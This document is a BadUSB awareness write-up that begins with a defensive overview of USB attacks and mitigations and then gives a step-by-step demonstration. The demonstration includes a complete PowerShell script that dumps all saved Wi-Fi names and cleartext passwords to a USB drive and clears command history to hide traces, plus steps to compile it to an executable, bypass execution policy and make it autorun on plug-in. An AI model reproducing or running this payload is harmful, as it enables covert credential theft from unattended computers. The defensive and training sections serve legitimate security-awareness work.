Title: USB Security Demonstration – BadUSB Techniques
Author: Samuel Cesar
Role: Cyber Security Professional
Date: March 2026
Description: Demonstration of BadUSB techniques for educational and cybersecurity awareness purposes.

           Overview
This document provides an overview of USB-based attack techniques for cybersecurity awareness. It demonstrates how malicious USB devices, also known as BadUSB, can emulate trusted devices to perform unauthorized actions and highlights the risks they pose in both corporate and home environments.
           Introduction to BadUSB Attacks
               Definition
BadUSB attacks involve reprogramming USB device firmware to perform malicious or unintended actions.
               Capabilities
    • Functions as a trusted device (keyboard, network adapter, or storage device)
    • Can automatically execute commands or payloads
    • Bypasses traditional security controls
Attack Vectors
    • Delivers malicious payloads
    • Opens backdoors
    • Exfiltrates sensitive data
What is a BadUSB Attack?
    • Reprogrammed USB firmware mimics legitimate devices.
    • Executes commands, redirects network traffic, or runs malware.
    • Bypasses security by appearing as a trusted device.
How BadUSB Attacks Work
    • Firmware Reprogramming: Modifies USB device functionality.
    • Device Emulation: Mimics keyboards, network interfaces, or storage devices.
    • Payload Execution: Runs pre-programmed scripts or malware automatically.
Types of BadUSB Attacks
    • Keyboard Emulation: Automatically types commands to control the device.
    • Network Interface Emulation: Redirects or hijacks network traffic.
    • Mass Storage Exploits: Runs hidden scripts or delivers malware.
Detection and Defense Mechanisms
               USB Device Policy Management
    • Disable USB access through Group Policies.
    • Monitor USB activity using Endpoint Detection and Response (EDR) solutions.
Hardware Security Controls
    • Use physical port blockers.
    • Implement device whitelisting to allow only approved USB devices.
Employee Training
    • Educate employees on the dangers of unknown USB devices.
    • Conduct simulated USB drop exercises to raise awareness.
Mitigating BadUSB Attacks
               Device Control Software
    • Enforces USB usage policies.
    • Restricts unauthorized device types.
Firmware Security Measures
    • Use non-reprogrammable USB devices.
    • Prefer encrypted USB storage.
USB Usage Policies
    • Promote secure file-sharing alternatives.
    • Implement strict organizational USB usage guidelines.
Discussion and Employee Training
               Key Topics
    • Recognizing suspicious USB devices.
    • Following corporate USB policies.
    • Reporting unfamiliar USB devices.
Training Exercises
    • Simulate USB drop attacks.
    • Group discussions on personal USB security experiences.
Real-world incidents show that USB devices can bypass security controls. Employee training and awareness are crucial for prevention.
           USB Rubber Ducky
The USB Rubber Ducky is a versatile penetration testing tool that emulates a keyboard (HID device) and executes scripts automatically when plugged in.
               Key Features
    • Acts as a HID keyboard, undetected as malicious.
    • Uses Ducky Script, a simple scripting language for payloads.
    • Cross-platform compatibility: Windows, macOS, Linux, and Android.
    • Payloads stored on swappable MicroSD cards.
    • Plug-and-Play execution upon connection.
Common Uses
    • Credential Harvesting.
    • Backdoor installation.
    • HID injection testing.
    • System manipulation.
    • Multi-Platform attacks.
Security Implications and Defenses
               Risks
    • Bypasses security by appearing as a keyboard.
    • Executes commands without user awareness.
Defenses
    • Enforce strict USB device policies.
    • Educate employees on USB risks.
    • Use EDR solutions to detect abnormal keystrokes.
    • Implement screen-locking policies on unattended systems.
    • Ensure systems are locked when not in use.
Variants and Similar Devices
    • Bash Bunny: Advanced USB attack device with multiple payload options.
    • BadUSB Devices: Modified USB drives exploiting firmware vulnerabilities.
USB Rubber Ducky with Raspberry Pi Pico
    • Objective: Demonstrate creating a USB Rubber Ducky using a Raspberry Pi Pico.
    • Benefits: Low-cost, customizable, and accessible for testing.
Conclusion
BadUSB attacks demonstrate the importance of physical and cybersecurity measures. User awareness, strong organizational policies, and technical defenses are essential to mitigate these risks.
           References
    • Redpill Cybersecurity. "Bad USB Attacks." https://redpillcybersecurity.notion.site/Bad-USB-Attacks-13bd3adde39c8086b533e519ec177c85
    • Hak5. "USB Rubber Ducky." https://shop.hak5.org/products/usb-rubber-ducky
    • Redpill Cybersecurity. "Bad USB USB Rubber Ducky." https://redpillcybersecurity.notion.site/Bad-USB-USB-Rubber-Ducky-13bd3adde39c80a59e34dafd616bab8f
    • Redpill Cybersecurity. "DIY Rubber Ducky Raspberry Pi Pico." https://redpillcybersecurity.notion.site/DIY-Rubber-Ducky-Raspberry-Pi-Pico-139d3adde39c80409c9bd47be52b8b74
----
Demonstration:

Turnning a Rubber Ducky into a generic USB flash drive.

First formating the USB drive for a clear walktrought.
I recommend renaming the USB drive for easy identification.

Second, we’ll choice to use the SamLogic USB AutoRun Creator by simplise, so we need download and install:
https://en.softonic.com/download/usb-autorun-creator/windows/post-download

Install module ps2exe via PowerShell Administrator
Command:  Install-Module ps2exe

Third, I found this script available on the internet to create a first script (PowerShell script) so that it's clear how we can manipulate the USB drive:


-----
# Define the volume label you're looking for
$targetLabel = "usb-name-here"

# Find the drive letter of the USB drive with the specified label
$volume = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }

if ($volume) {
    $driveLetter = $volume.DriveLetter + ":\"
    $usbPath = "$driveLetter$env:username.txt"
    $baseDestinationDir = $driveLetter
    Write-Output "Drive letter found: $driveLetter"
} else {
    Write-Error "Drive with label '$targetLabel' not found."
    exit
}

# Initialize an array to store all Wi-Fi profiles and their passwords
$wifiData = @()

# Get all Wi-Fi profiles
$profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'

foreach ($profile in $profiles) {
    $wlan = $profile.Matches.Value.Trim()

    # Get the password for the current Wi-Fi profile
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
    $password = if ($passw) { $passw.Matches.Value.Trim() } else { "No Password Found" }

    # Create a custom object with the profile and password information
    $wifiData += [PSCustomObject]@{
        Username = $env:username
        Profile  = $wlan
        Password = $password
    }
}

# Convert the array of Wi-Fi data to JSON
$jsonBody = $wifiData | ConvertTo-Json -Depth 3

# Save the JSON data to a file on the USB drive
$jsonBody | Out-File -FilePath $usbPath -Encoding UTF8



# Clear the PowerShell command history
Clear-History

exit
----


I Recommend reading each line and understanding its function.

After copying and pasting the script into Notepad, save it as a .ps1 file.

Next, use the Invoke-PS2EXE command to convert the script (Fsociety.ps1) into an executable file named FSociety.exe.

Command:
Invoke-PS2EXE .\FSociety.ps1 FSociety.exe

Note: Consistent naming is important for everything to work properly.

In some PowerShell versions, you may encounter script execution restrictions. If this happens, use the following command to temporarily bypass the restriction for the current session:
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process


After preparing the USB drive, the tool, and the script, we can proceed with the SamLogic USB AutoRun Creator.
Open SamLogic USB AutoRun Creator:

1 - Select the .exe file
2 - Select the USB drive
3 - Click Create


Now we will test the USB drive. Unplug it and plug it back in to execute the payload.

A CMD window with the name of the executable file will briefly open and then close.

Go to the USB folder and check the results. In this demonstration, the script stored Wi-Fi network names and passwords in a .txt file.

This example is intended to demonstrate how a BadUSB-style technique could be used in a real-world attack scenario if proper security controls are not in place.
It highlights the importance of protecting systems against unauthorized USB devices, both in corporate and home environments.
